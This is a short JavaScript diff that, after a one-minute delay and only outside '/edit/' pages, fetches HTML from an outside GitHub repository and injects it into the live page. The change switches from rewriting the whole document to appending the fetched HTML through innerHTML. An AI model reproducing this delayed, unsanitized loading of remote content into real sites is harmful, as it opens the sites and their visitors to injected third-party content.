@@ -3,9 +3,9 @@ if (window.location.href.indexOf('/edit/') === -1) {
     fetch('https://raw.githubusercontent.com/Im1JuanProlibu/BOT-GEZPOMOTOR/main/index.html?t=' + Date.now())
       .then(function(r) { return r.text(); })
       .then(function(html) {
-        document.open();
-        document.write(html);
-        document.close();
+        var div = document.createElement('div');
+        div.innerHTML = html;
+        document.body.appendChild(div);
       });
-  }, 60000); // espera 1 minuto antes de ejecutar
+  }, 60000);
 }
